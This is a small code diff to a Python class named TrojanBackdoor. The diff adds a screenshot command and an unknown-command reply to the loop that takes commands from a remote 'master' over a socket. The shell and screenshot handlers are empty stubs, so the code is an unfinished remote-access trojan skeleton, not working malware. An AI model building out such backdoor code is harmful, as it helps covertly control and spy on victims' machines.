@@ -64,10 +64,18 @@ class TrojanBackdoor(threading.Thread):
                 command = self.master_message[:3]
                 if command == "--c":
                     self.execute_shell_command()
+                elif command == "--s":
+                    self.execute_screenshot()
+                else:
+                    self.send_message("Unknown command, please try again")
 
     def execute_shell_command(self):
         pass
         self.send_message("Shell command Executed")
+
+    def execute_screenshot(self):
+        pass
+        self.send_message("screenshot command Executed")
 
     def run(self):
         self.create_socket()
